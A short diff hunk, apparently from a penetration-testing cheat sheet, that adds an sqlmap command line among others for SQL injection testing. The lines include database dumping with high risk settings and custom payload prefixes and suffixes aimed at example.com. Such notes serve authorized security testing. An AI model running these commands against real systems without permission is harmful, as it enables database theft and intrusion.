@@ -435,6 +435,7 @@ sqlmap -r req.txt --batch --dump --risk=3
 
 # Force sqlmap to test more boundaries `--level=5`. Helps determine the prefix to use.
 sqlmap -r req.txt --level=5 -v 3
+sqlmap -r req.txt --level=5 --string="Welcome" -v 3 # Check webpage for successful string!
 
 # Specifying a prefix or suffix. Test different payloads wotfor correct prefix
 sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
